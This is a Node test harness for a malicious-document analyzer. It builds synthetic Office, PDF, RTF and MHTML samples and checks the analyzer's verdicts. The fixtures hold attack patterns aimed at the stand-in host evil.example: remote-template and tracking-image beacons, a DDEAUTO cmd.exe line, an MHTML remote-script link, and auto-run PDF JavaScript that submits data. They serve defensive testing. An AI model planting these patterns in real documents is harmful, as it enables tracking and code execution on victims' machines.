// Node test harness. Builds synthetic samples + uses real Office add-ins, asserts verdicts.
import { readFileSync, existsSync } from 'node:fs';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const JSZip = require('jszip');
globalThis.JSZip = JSZip;

const { analyzeFile } = await import('../assets/js/analyze.js');

let pass = 0, fail = 0;
const results = [];
async function check(name, bytes, expect, mustFind) {
  const fileName = typeof bytes === 'string' ? bytes : name;
  const data = bytes instanceof Uint8Array ? bytes : new Uint8Array(readFileSync(bytes));
  const report = await analyzeFile(fileName, data);
  const kinds = report.findings.map((f) => f.kind);
  const titles = report.findings.map((f) => f.title.toLowerCase());
  let ok = report.verdict === expect;
  if (ok && mustFind) ok = mustFind.every((k) => kinds.includes(k) || titles.some((t) => t.includes(k)));
  results.push([ok, name, `verdict=${report.verdict} (want ${expect}) findings=[${kinds.join(',') || 'none'}]`]);
  ok ? pass++ : fail++;
}

const te = (s) => new TextEncoder().encode(s);

// ---- OOXML: external image relationship (the MSRC beacon) ----
{
  const rels = `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>`;
  const docRels = `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://evil.example/track.png?id=victim" TargetMode="External"/></Relationships>`;
  const zip = new JSZip();
  zip.file('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>');
  zip.file('_rels/.rels', rels);
  zip.file('word/document.xml', '<?xml version="1.0"?><w:document xmlns:w="x"><w:body/></w:document>');
  zip.file('word/_rels/document.xml.rels', docRels);
  await check('docx: external image beacon', new Uint8Array(await zip.generateAsync({ type: 'uint8array' })).map ? new Uint8Array(await zip.generateAsync({ type: 'uint8array' })) : null || await zipBytes(zip, 'beacon.docx'), 'dangerous', ['remote']);
}

async function zipBytes(zip) { return new Uint8Array(await zip.generateAsync({ type: 'uint8array' })); }

// ---- OOXML: remote attached template ----
{
  const zip = new JSZip();
  zip.file('[Content_Types].xml', '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>');
  zip.file('_rels/.rels', '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>');
  zip.file('word/document.xml', '<w:document xmlns:w="x"><w:body/></w:document>');
  zip.file('word/_rels/settings.xml.rels', '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>');
  await check('docx: remote template', await zipBytes(zip), 'dangerous', ['remote']);
}

// ---- OOXML: clean file ----
{
  const zip = new JSZip();
  zip.file('[Content_Types].xml', '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>');
  zip.file('_rels/.rels', '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>');
  zip.file('word/document.xml', '<w:document xmlns:w="x"><w:body><w:p><w:r><w:t>Just a clean memo about lunch.</w:t></w:r></w:p></w:body></w:document>');
  zip.file('word/media/image1.png', new Uint8Array([0x89, 0x50, 0x4e, 0x47]));
  await check('docx: clean document', await zipBytes(zip), 'safe');
}

// ---- Word 2003 XML with DDE command ----
await check('xml: DDE command formula', te('<?xml version="1.0"?><?mso-application progid="Word.Document"?><w:wordDocument xmlns:w="x"><w:body>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc"</w:body></w:wordDocument>'), 'dangerous', ['dde']);

// ---- MHTML pointing at a script (CVE-2021-40444 shape) ----
await check('mht: mhtml script resource', te('MIME-Version: 1.0\nContent-Type: multipart/related; boundary="x"\nX-MSO: office\n\n--x\nContent-Location: mhtml:http://evil.example/x!file.wsf\nContent-Type: text/html\n\n<html>mso-application</html>\n--x--'), 'dangerous', ['mhtml']);

// ---- PDF: OpenAction JavaScript ----
await check('pdf: auto-run javascript', te('%PDF-1.7\n1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n2 0 obj<</S/JavaScript/JS(app.alert("hi");this.submitForm("http://evil.example/x"))>>endobj\ntrailer<</Root 1 0 R>>'), 'dangerous', ['script']);

// ---- PDF: clean with an ordinary link ----
await check('pdf: clean with link', te('%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\n2 0 obj<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://example.com/about)>>>>endobj\ntrailer<</Root 1 0 R>>'), 'safe');

// ---- RTF: auto-updating linked object ----
await check('rtf: objupdate link', te('{\\rtf1\\ansi{\\object\\objautlink\\objupdate{\\*\\objclass OLE2Link}{\\*\\objdata 01050000}}}'), 'dangerous', ['linked object']);

// ---- RTF: clean ----
await check('rtf: clean', te('{\\rtf1\\ansi\\deff0 {\\fonttbl{\\f0 Arial;}}\\f0 Hello, this is a plain note.}'), 'safe');

// ---- Real Office add-ins with macros (if present on this machine) ----
const addins = [
  'C:/Program Files/Microsoft Office/root/Office16/Library/Analysis/ATPVBAEN.XLAM',
  'C:/Program Files/Microsoft Office/root/Office16/1033/EXPTOOWS.XLA',
];
for (const p of addins) if (existsSync(p)) await check(`real add-in: ${p.split('/').pop()}`, p, 'dangerous', ['macro']);

// ---- Plain text / unsupported ----
await check('txt: plain text', te('nothing to see here, just notes'), 'unknown');

for (const [ok, name, info] of results) console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}  ::  ${info}`);
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
